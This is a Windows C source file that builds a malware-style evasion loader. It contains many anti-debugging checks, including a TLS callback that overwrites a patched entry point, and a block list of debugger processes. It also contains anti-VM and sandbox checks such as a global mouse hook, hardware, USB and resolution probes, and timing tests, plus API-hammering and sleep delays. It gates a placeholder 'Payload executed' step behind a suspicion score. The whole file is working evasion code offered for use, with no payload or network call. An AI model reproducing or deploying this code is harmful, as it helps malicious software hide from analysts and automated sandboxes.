#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <intrin.h>
#include <winternl.h>




#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "ntdll.lib")
typedef struct _KUSER_SHARED_DATA {
    ULONG TickCountLowDeprecated;
    ULONG TickCountMultiplier;
    volatile LARGE_INTEGER InterruptTime;
    volatile LARGE_INTEGER SystemTime;
    volatile LARGE_INTEGER TimeZoneBias;
} KUSER_SHARED_DATA;

#define USER_SHARED_DATA ((KUSER_SHARED_DATA*)0x7FFE0000)
#define DELAY_TICKS 10000

typedef struct _MY_PEB {
#ifdef _WIN64
    BYTE Padding[0xBC];
#else
    BYTE Padding[0x68];
#endif
    ULONG NtGlobalFlag;
} MY_PEB, * PMY_PEB;


#ifndef ProcessDebugFlags
#define ProcessDebugFlags 0x1F
#endif



#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

#define INT3_INSTRUCTION_OPCODE      0xCC
#define JMP_INSTRUCTION_OPCODE       0xE9



VOID AntiDebuggingTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);
int main();



#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")
#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)AntiDebuggingTlsCallback;
#pragma const_seg()



BOOL IsDebuggerPresent3() {

#ifdef _WIN64
    PMY_PEB pPeb = (PMY_PEB)(__readgsqword(0x60));
#elif _WIN32
    PMY_PEB pPeb = (PMY_PEB)(__readfsdword(0x30));
#endif

    if (pPeb->NtGlobalFlag == (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS))
        return TRUE;

    return FALSE;
}


typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE              ProcessHandle,
    PROCESSINFOCLASS    ProcessInformationClass,
    PVOID               ProcessInformation,
    ULONG               ProcessInformationLength,
    PULONG              ReturnLength
    );

BOOL AntiDbgNtProcessDebugFlags() {

    NTSTATUS                      STATUS = 0x00;
    fnNtQueryInformationProcess   pNtQueryInformationProcess = NULL;
    DWORD64                       dwProcessDebugObjectHandle = 0x00;
    ULONG                         uInherit = 0x00;

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)ProcessDebugFlags, &uInherit, sizeof(ULONG), NULL)) == 0x00 && !uInherit)
        return TRUE;

    return FALSE;
}


BOOL AntiVmRdtscWin32(VOID) {
    DWORD tsc1 = 0;
    DWORD tsc2 = 0;
    DWORD tsc3 = 0;

    for (int i = 0; i < 10; i++)
    {
        tsc1 = (DWORD)__rdtsc();

        GetProcessHeap();

        tsc2 = (DWORD)__rdtsc();

        CloseHandle(NULL);

        tsc3 = (DWORD)__rdtsc();

        if ((tsc2 - tsc1) != 0 && (tsc3 - tsc2) / (tsc2 - tsc1) >= 10) {
            return FALSE;
        }
    }

    return TRUE;
}


typedef enum _SYSDBG_COMMAND
{
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation,
    SysDbgSetTracepoint,
    SysDbgSetSpecialCall,
    SysDbgClearSpecialCalls,
    SysDbgQuerySpecialCalls,
    SysDbgBreakPoint,
    SysDbgQueryVersion,
    SysDbgReadVirtual,
    SysDbgWriteVirtual,
    SysDbgReadPhysical,
    SysDbgWritePhysical,
    SysDbgReadControlSpace,
    SysDbgWriteControlSpace,
    SysDbgReadIoSpace,
    SysDbgWriteIoSpace,
    SysDbgReadMsr,
    SysDbgWriteMsr,
    SysDbgReadBusData,
    SysDbgWriteBusData,
    SysDbgCheckLowMemory,
    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump,
    SysDbgGetKdBlockEnable,
    SysDbgSetKdBlockEnable,
    SysDbgRegisterForUmBreakInfo,
    SysDbgGetUmBreakPid,
    SysDbgClearUmBreakPid,
    SysDbgGetUmAttachPid,
    SysDbgClearUmAttachPid,
    SysDbgGetLiveKernelDump,
    SysDbgKdPullRemoteFile,
    SysDbgMaxInfoClass
} SYSDBG_COMMAND, * PSYSDBG_COMMAND;

typedef NTSTATUS(NTAPI* fnNtSystemDebugControl)(
    SYSDBG_COMMAND  Command,
    PVOID           InputBuffer,
    ULONG           InputBufferLength,
    PVOID           OutputBuffer,
    ULONG           OutputBufferLength,
    PULONG          ReturnLength
    );

BOOL AntiDbgNtSystemDebugControl() {

    NTSTATUS                    STATUS = 0x00;
    fnNtSystemDebugControl      pNtSystemDebugControl = NULL;

    if (!(pNtSystemDebugControl = (fnNtSystemDebugControl)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtSystemDebugControl"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtSystemDebugControl(SysDbgBreakPoint, NULL, 0, NULL, 0, NULL)) == (NTSTATUS)0xC0000354)
        return FALSE;

    return TRUE;
}




VOID AntiDebuggingTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {

    DWORD       dwOldProtection = 0x00,
        dwJumpOffset = 0x00;
    ULONG_PTR   uMainFunc = (ULONG_PTR)main;

    if (dwReason == DLL_PROCESS_ATTACH) {

        if (*(BYTE*)uMainFunc == JMP_INSTRUCTION_OPCODE) {

            printf("[TLS][i] Current Entry Point Is mainCRTStartup, Calculating The Address Of The Real Entry Point ...\n");

            uMainFunc++;
            dwJumpOffset = *(DWORD*)(uMainFunc);
            uMainFunc = uMainFunc + dwJumpOffset + sizeof(DWORD);
        }

        printf("[TLS][i] Entry Point Address: 0x%p \n", (LPVOID)uMainFunc);

        if (*(BYTE*)uMainFunc == INT3_INSTRUCTION_OPCODE) {
            printf("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");

            if (VirtualProtect((LPVOID)uMainFunc, 4096, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
                memset((void*)uMainFunc, INT3_INSTRUCTION_OPCODE, 4096);
                printf("[TLS][+] Entry Point Is Overwritten With 0x%0.2X Bytes \n", INT3_INSTRUCTION_OPCODE);
            }
            else {
                printf("[TLS][!] Failed To Overwrite The Entry Point\n");
            }
        }
    }
}




DWORD   g_dwMouseClicks = 0x00;
HHOOK   g_hMouseHook = NULL;

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
        g_dwMouseClicks++;

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG Msg = { 0 };

    if (!(g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))) {
        printf("[!] SetWindowsHookExW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    while (GetMessageW(&Msg, NULL, 0, 0))
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);

    return TRUE;
}

BOOL IsVirtualEnvUserInteraction(IN DWORD dwMonitorTimeInSec, IN OPTIONAL DWORD dwNmbrOfMouseClicks) {

    HANDLE  hThread = NULL;
    DWORD   dwMouseClicks = 0x05;

    if (!dwMonitorTimeInSec)
        return FALSE;

    if (dwNmbrOfMouseClicks && dwNmbrOfMouseClicks > 1)
        dwMouseClicks = dwNmbrOfMouseClicks;

    if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, 0x00, NULL))) {
        printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(hThread, dwMonitorTimeInSec * 1000);

    if ((g_hMouseHook != NULL) && !UnhookWindowsHookEx(g_hMouseHook)) {
        printf("[!] UnhookWindowsHookEx Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if (g_dwMouseClicks <= dwMouseClicks)
        return TRUE;

    return FALSE;
}




BOOL IsVirtualEnvHardwareCheck() {

    SYSTEM_INFO     SystemInfo = { 0 };
    MEMORYSTATUSEX  MemoryStatus = { 0 };

    MemoryStatus.dwLength = sizeof(MEMORYSTATUSEX);

    HKEY  hKey = NULL;

    DWORD dwUsbNumber = 0;
    DWORD dwRegErr = 0;

    GetSystemInfo(&SystemInfo);
    if (SystemInfo.dwNumberOfProcessors < 2)
        return TRUE;

    if (!GlobalMemoryStatusEx(&MemoryStatus)) {
        printf("[!] GlobalMemoryStatusEx Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    
    if (MemoryStatus.ullTotalPhys < (4ULL * 1073741824ULL))
        return TRUE;

    if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: %d \n", dwRegErr);
        return FALSE;
    }

    if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegQueryInfoKeyA Failed With Error: %d \n", dwRegErr);
        return FALSE;
    }

    if (dwUsbNumber < 2) {
        RegCloseKey(hKey);
        return TRUE;
    }

    if ((dwRegErr = RegCloseKey(hKey)) != ERROR_SUCCESS) {
        printf("[!] RegCloseKey Failed With Error: %d \n", dwRegErr);
        return FALSE;
    }

    return FALSE;
}




BOOL CALLBACK ResolutionCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM ldata) {

    MONITORINFO     MonitorInfo = { 0 };
    INT             X = 0,
        Y = 0;

    MonitorInfo.cbSize = sizeof(MONITORINFO);

    if (!GetMonitorInfoW(hMonitor, &MonitorInfo)) {
        printf("[!] GetMonitorInfoW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    X = MonitorInfo.rcMonitor.right - MonitorInfo.rcMonitor.left;
    Y = MonitorInfo.rcMonitor.bottom - MonitorInfo.rcMonitor.top;

    if (X < 0) X = -X;
    if (Y < 0) Y = -Y;

    if (X < 1080 || Y < 900)
        *((BOOL*)ldata) = TRUE;

    return TRUE;
}

BOOL IsVirtualEnvResolutionCheck() {

    BOOL bResult = FALSE;

    if (!EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ResolutionCallback, (LPARAM)&bResult)) {
        printf("[!] EnumDisplayMonitors Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    return bResult;
}




BOOL ExeDigitsInNameCheck() {

    CHAR    Path[MAX_PATH * 3];
    CHAR    cName[MAX_PATH];
    DWORD   dwNumberOfDigits = 0;

    if (!GetModuleFileNameA(NULL, Path, MAX_PATH * 3)) {
        printf("\n\t[!] GetModuleFileNameA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (lstrlenA(PathFindFileNameA(Path)) < MAX_PATH)
        lstrcpyA(cName, PathFindFileNameA(Path));

    for (int i = 0; i < lstrlenA(cName); i++) {
        if (isdigit(cName[i]))
            dwNumberOfDigits++;
    }

    if (dwNumberOfDigits > 3) {
        return TRUE;
    }

    return FALSE;
}

BOOL CheckMachineProcesses() {

    DWORD   adwProcesses[1024];
    DWORD   dwReturnLen = 0,
        dwNmbrOfPids = 0;

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
        printf("\n\t[!] EnumProcesses Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen / sizeof(DWORD);

    if (dwNmbrOfPids < 50)
        return TRUE;

    return FALSE;
}



#define BLACKLISTARRAY_SIZE 5

const WCHAR* g_BlackListedDebuggers[BLACKLISTARRAY_SIZE] = {
        L"x64dbg.exe",
        L"ida.exe",
        L"ida64.exe",
        L"VsDebugConsole.exe",
        L"msvsmon.exe"
};

BOOL BlackListedProcessesCheck() {

    HANDLE              hSnapShot = NULL;
    PROCESSENTRY32W ProcEntry = { 0 };
    ProcEntry.dwSize = sizeof(PROCESSENTRY32W);
    BOOL                bSTATE = FALSE;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32FirstW(hSnapShot, &ProcEntry)) {
        printf("\t[!] Process32FirstW Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    do {
        for (int i = 0; i < BLACKLISTARRAY_SIZE; i++) {
            if (wcscmp(ProcEntry.szExeFile, g_BlackListedDebuggers[i]) == 0) {
                wprintf(L"\t[i] Found \"%s\" Of Pid : %d \n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
                bSTATE = TRUE;
                break;
            }
        }
    } while (Process32NextW(hSnapShot, &ProcEntry));

_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    return bSTATE;
}




BOOL TimeTickCheck1() {

    ULONGLONG   dwTime1 = 0,
        dwTime2 = 0;

    dwTime1 = GetTickCount64();

    for (volatile int i = 0; i < 1000000; i++) {
        int x = i * i;
    }

    dwTime2 = GetTickCount64();

    printf("\t[i] (dwTime2 - dwTime1) : %llu \n", (dwTime2 - dwTime1));

    if ((dwTime2 - dwTime1) > 50) {
        return TRUE;
    }

    return FALSE;
}

BOOL TimeTickCheck2() {

    LARGE_INTEGER   Time1 = { 0 },
        Time2 = { 0 };

    if (!QueryPerformanceCounter(&Time1)) {
        printf("\t[!] QueryPerformanceCounter [1] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    for (volatile int i = 0; i < 1000000; i++) {
        int x = i * i;
    }

    if (!QueryPerformanceCounter(&Time2)) {
        printf("\t[!] QueryPerformanceCounter [2] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("\t[i] (Time2.QuadPart - Time1.QuadPart) : %lld \n", (Time2.QuadPart - Time1.QuadPart));

    if ((Time2.QuadPart - Time1.QuadPart) > 100000) {
        return TRUE;
    }

    return FALSE;
}




BOOL DebugBreakCheck() {

    __try {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        return FALSE;
    }

    return TRUE;
}

BOOL OutputDebugStringCheck() {

    SetLastError(1);
    OutputDebugStringW(L"Happy for you!");

    if (GetLastError() == 0) {
        return TRUE;
    }

    return FALSE;
}

#define DELETE_HANDLE(hFile)                                    \
    if (hFile != INVALID_HANDLE_VALUE && hFile != NULL){        \
        CloseHandle(hFile);                                     \
        hFile = NULL;                                           \
    }\

#define DELETE_HEAP_PNTR(pBuffer)                                \
    if (pBuffer != NULL){                                        \
        HeapFree(GetProcessHeap(), 0x00, pBuffer);               \
        pBuffer = NULL;                                          \
    }\

BOOL ApiHammering(IN DWORD dwStress) {

    BOOL        bResult = FALSE;
    WCHAR		szTmpFileName[MAX_PATH] = { 0x00 };
    WCHAR		szTmpPath[MAX_PATH] = { 0x00 };
    HANDLE      hWriteFile = INVALID_HANDLE_VALUE,
        hReadFile = INVALID_HANDLE_VALUE;
    PBYTE       pTmpPntrVar = NULL;
    DWORD       dwTmpLengthVar = 0x00;
    CONST DWORD dwBufferSize = 0xFFFFF;

    if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
        printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetTempFileNameW(szTmpPath, L"AH", 0x00, szTmpFileName) == 0x00) {
        printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    for (DWORD i = 0; i < dwStress; i++) {

        if (!(pTmpPntrVar = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize))) {
            printf("[!] HeapAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        if ((hWriteFile = CreateFileW(szTmpFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
            printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        memset(pTmpPntrVar, rand(), dwBufferSize);

        if (!WriteFile(hWriteFile, pTmpPntrVar, dwBufferSize, &dwTmpLengthVar, NULL) || dwBufferSize != dwTmpLengthVar) {
            printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
            printf("[i] Wrote %d of %d Bytes\n", dwTmpLengthVar, dwBufferSize);
            goto _END_OF_FUNC;
        }

        DELETE_HANDLE(hWriteFile);
        memset(pTmpPntrVar, 0x00, dwBufferSize);

        if ((hReadFile = CreateFileW(szTmpFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
            printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        if (!ReadFile(hReadFile, pTmpPntrVar, dwBufferSize, &dwTmpLengthVar, NULL) || dwBufferSize != dwTmpLengthVar) {
            printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
            printf("[i] Read %d of %d Bytes\n", dwTmpLengthVar, dwBufferSize);
            goto _END_OF_FUNC;
        }

        DELETE_HANDLE(hReadFile);
        memset(pTmpPntrVar, 0x00, dwBufferSize);

        DELETE_HEAP_PNTR(pTmpPntrVar);
    }

    bResult = TRUE;

_END_OF_FUNC:
    DELETE_HANDLE(hReadFile);
    DELETE_HANDLE(hWriteFile);
    DELETE_HEAP_PNTR(pTmpPntrVar);
    return bResult;
}

BOOL DelayExecutionViaApiHammering(IN DWORD dwMilliSeconds) {

    DWORD       dwT0 = 0x00,
        dwT1 = 0x00;

    dwT0 = GetTickCount64();

    
    if (!ApiHammering(dwMilliSeconds * 220))
        return FALSE;

    dwT1 = GetTickCount64();

    if ((dwT1 - dwT0) < dwMilliSeconds)
        return FALSE;
    else
        return TRUE;
}

BOOL DelayExecution1(IN DWORD dwMinutes) {

    BOOL        bResult = FALSE;
    DWORD       dwMilliSeconds = dwMinutes * 60000;
    HANDLE      hEvent = NULL;
    DWORD       dwT0 = 0x00,
        dwT1 = 0x00;

    dwT0 = GetTickCount64();

    if (!(hEvent = CreateEventW(NULL, NULL, NULL, NULL))) {
        printf("[!] CreateEventW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (WaitForSingleObject(hEvent, dwMilliSeconds) == WAIT_FAILED) {
        printf("[!] WaitForSingleObject Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    dwT1 = GetTickCount64();

    if ((dwT1 - dwT0) < dwMilliSeconds)
        goto _END_OF_FUNC;

    bResult = TRUE;

_END_OF_FUNC:
    if (hEvent)
        CloseHandle(hEvent);
    return bResult;
}

BOOL DelayExecution2(IN DWORD dwMinutes) {

    BOOL        bResult = FALSE;
    DWORD       dwMilliSeconds = dwMinutes * 60000;
    HANDLE      hEvent = NULL;
    DWORD       dwT0 = 0x00,
        dwT1 = 0x00;

    dwT0 = GetTickCount64();

    if (!(hEvent = CreateEventW(NULL, NULL, NULL, NULL))) {
        printf("[!] CreateEventW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (MsgWaitForMultipleObjectsEx(0x01, &hEvent, dwMilliSeconds, QS_HOTKEY, 0x00) == WAIT_FAILED) {
        printf("[!] MsgWaitForMultipleObjectsEx Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    dwT1 = GetTickCount64();

    if ((dwT1 - dwT0) < dwMilliSeconds)
        goto _END_OF_FUNC;

    bResult = TRUE;

_END_OF_FUNC:
    if (hEvent)
        CloseHandle(hEvent);
    return bResult;
}


typedef NTSTATUS(NTAPI* fnNtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

BOOL DelayExecution3(IN DWORD dwMinutes) {

    fnNtWaitForSingleObject pNtWaitForSingleObject = NULL;
    BOOL                    bResult = FALSE;
    DWORD                   dwMilliSeconds = dwMinutes * 60000;
    HANDLE                  hEvent = NULL;
    NTSTATUS                STATUS = 0x00;
    DWORD                   dwT0 = 0x00,
        dwT1 = 0x00;
    LARGE_INTEGER           DelayIntrvl = { 0 };

    if (!(pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtWaitForSingleObject"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if (!(hEvent = CreateEventW(NULL, NULL, NULL, NULL))) {
        printf("[!] CreateEventW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    dwT0 = GetTickCount64();

    DelayIntrvl.QuadPart = -((LONGLONG)(dwMilliSeconds * 10000));

    if ((STATUS = pNtWaitForSingleObject(hEvent, FALSE, &DelayIntrvl)) != 0x00 && STATUS != STATUS_TIMEOUT) {
        printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
        goto _END_OF_FUNC;
    }

    dwT1 = GetTickCount64();

    if ((dwT1 - dwT0) < dwMilliSeconds)
        goto _END_OF_FUNC;

    bResult = TRUE;

_END_OF_FUNC:
    if (hEvent)
        CloseHandle(hEvent);
    return bResult;
}


#define DELAY_TICKS 10000

ULONG64 SharedTimeStamp() {

    LARGE_INTEGER TimeStamp;

    TimeStamp.LowPart = USER_SHARED_DATA->SystemTime.LowPart;
    TimeStamp.HighPart = USER_SHARED_DATA->SystemTime.HighPart;

    return TimeStamp.QuadPart;
}

VOID SharedSleep(IN ULONG64 uMilliseconds) {

    ULONG64 uStart = SharedTimeStamp() + (uMilliseconds * DELAY_TICKS);

    for (SIZE_T RandomNmbr = 0; SharedTimeStamp() < uStart; RandomNmbr++);

    if ((SharedTimeStamp() - uStart) > 2000)
        return;
}


int main() {

    int score = 0;

    // ---- Anti Debug ----

    if (IsDebuggerPresent3()) {
        printf("[!] NtGlobalFlag triggered\n");
        score += 30;
    }

    if (AntiDbgNtProcessDebugFlags()) {
        printf("[!] DebugFlags triggered\n");
        score += 30;
    }

    if (AntiDbgNtSystemDebugControl()) {
        printf("[!] Kernel debugger detected\n");
        score += 40;
    }

    if (BlackListedProcessesCheck()) {
        printf("[!] Debugger process detected\n");
        score += 25;
    }

    if (DebugBreakCheck()) {
        printf("[!] Breakpoint behaviour detected\n");
        score += 20;
    }

    if (OutputDebugStringCheck()) {
        printf("[!] OutputDebugString anomaly\n");
        score += 15;
    }

    // ---- Timing ----

    if (TimeTickCheck1()) {
        printf("[!] Time anomaly check 1\n");
        score += 15;
    }

    if (TimeTickCheck2()) {
        printf("[!] Time anomaly check 2\n");
        score += 15;
    }

    if (!AntiVmRdtscWin32()) {
        printf("[!] RDTSC timing anomaly\n");
        score += 20;
    }

    // ---- Anti VM ----

    if (IsVirtualEnvUserInteraction(30, 2)) {
        printf("[!] No user interaction\n");
        score += 20;
    }

    if (IsVirtualEnvHardwareCheck()) {
        printf("[!] Hardware anomaly\n");
        score += 25;
    }

    if (IsVirtualEnvResolutionCheck()) {
        printf("[!] Suspicious resolution\n");
        score += 15;
    }

    if (ExeDigitsInNameCheck()) {
        printf("[!] Suspicious filename pattern\n");
        score += 10;
    }

    if (CheckMachineProcesses()) {
        printf("[!] VM processes detected\n");
        score += 30;
    }

    printf("Suspicion score: %d\n", score);

    if (score >= 85) {
        printf("Environment malicious for analysis\n");
        return -1;
    }

    if (score >= 60) {
        printf("Environment suspicious, delaying execution\n");
        Sleep(300000); 
        if(!DelayExecutionViaApiHammering(20000)) {
            printf("API hammering successed...\n");
            exit(0);
        }

        if (!DelayExecution1(3)) {
            printf("DelayEx1 detected ...\n");
            exit(0);
        }

        if (!DelayExecution2(3)) {
            printf("DelayEx2 detected ...\n");
            exit(0);
        }
        
        if (!DelayExecution3(3)) {
            printf("DelayEx3 detected ...\n");
            exit(0);
        }
        SharedSleep(60000);

    }

    printf("[+] Environment looks safe\n");

    MessageBoxA(NULL, "Payload executed", "OK", MB_OK);

    return 0;
}